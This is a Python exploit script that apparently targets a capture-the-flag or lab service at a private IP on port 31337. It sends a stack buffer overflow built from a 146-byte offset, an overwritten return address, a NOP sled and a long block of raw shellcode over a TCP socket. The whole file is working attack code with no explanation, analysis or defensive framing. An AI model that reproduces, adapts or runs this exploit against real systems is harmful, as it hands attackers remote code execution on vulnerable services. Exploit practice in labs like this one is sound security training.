import socket
import os

ip = "10.10.185.26"
port = 31337

# bad chars = \x0a

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = (
  "\xb8\xde\xc4\xd1\xa9\xda\xd3\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
  "\x52\x83\xeb\xfc\x31\x43\x0e\x03\x9d\xca\x33\x5c\xdd\x3b\x31"
  "\x9f\x1d\xbc\x56\x29\xf8\x8d\x56\x4d\x89\xbe\x66\x05\xdf\x32"
  "\x0c\x4b\xcb\xc1\x60\x44\xfc\x62\xce\xb2\x33\x72\x63\x86\x52"
  "\xf0\x7e\xdb\xb4\xc9\xb0\x2e\xb5\x0e\xac\xc3\xe7\xc7\xba\x76"
  "\x17\x63\xf6\x4a\x9c\x3f\x16\xcb\x41\xf7\x19\xfa\xd4\x83\x43"
  "\xdc\xd7\x40\xf8\x55\xcf\x85\xc5\x2c\x64\x7d\xb1\xae\xac\x4f"
  "\x3a\x1c\x91\x7f\xc9\x5c\xd6\xb8\x32\x2b\x2e\xbb\xcf\x2c\xf5"
  "\xc1\x0b\xb8\xed\x62\xdf\x1a\xc9\x93\x0c\xfc\x9a\x98\xf9\x8a"
  "\xc4\xbc\xfc\x5f\x7f\xb8\x75\x5e\xaf\x48\xcd\x45\x6b\x10\x95"
  "\xe4\x2a\xfc\x78\x18\x2c\x5f\x24\xbc\x27\x72\x31\xcd\x6a\x1b"
  "\xf6\xfc\x94\xdb\x90\x77\xe7\xe9\x3f\x2c\x6f\x42\xb7\xea\x68"
  "\xa5\xe2\x4b\xe6\x58\x0d\xac\x2f\x9f\x59\xfc\x47\x36\xe2\x97"
  "\x97\xb7\x37\x37\xc7\x17\xe8\xf8\xb7\xd7\x58\x91\xdd\xd7\x87"
  "\x81\xde\x3d\xa0\x28\x25\xd6\xc5\xa1\x2a\x11\xb2\xbb\x34\x4c"
  "\x1e\x35\xd2\x04\x8e\x13\x4d\xb1\x37\x3e\x05\x20\xb7\x94\x60"
  "\x62\x33\x1b\x95\x2d\xb4\x56\x85\xda\x34\x2d\xf7\x4d\x4a\x9b"
  "\x9f\x12\xd9\x40\x5f\x5c\xc2\xde\x08\x09\x34\x17\xdc\xa7\x6f"
  "\x81\xc2\x35\xe9\xea\x46\xe2\xca\xf5\x47\x67\x76\xd2\x57\xb1"
  "\x77\x5e\x03\x6d\x2e\x08\xfd\xcb\x98\xfa\x57\x82\x77\x55\x3f"
  "\x53\xb4\x66\x39\x5c\x91\x10\xa5\xed\x4c\x65\xda\xc2\x18\x61"
  "\xa3\x3e\xb9\x8e\x7e\xfb\xd9\x6c\xaa\xf6\x71\x29\x3f\xbb\x1f"
  "\xca\xea\xf8\x19\x49\x1e\x81\xdd\x51\x6b\x84\x9a\xd5\x80\xf4"
  "\xb3\xb3\xa6\xab\xb4\x91"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.send(bytes(buffer + "\n", "latin-1"))
  #s.recv(1024)
  s.close()
except:
  print("Could not connect.")
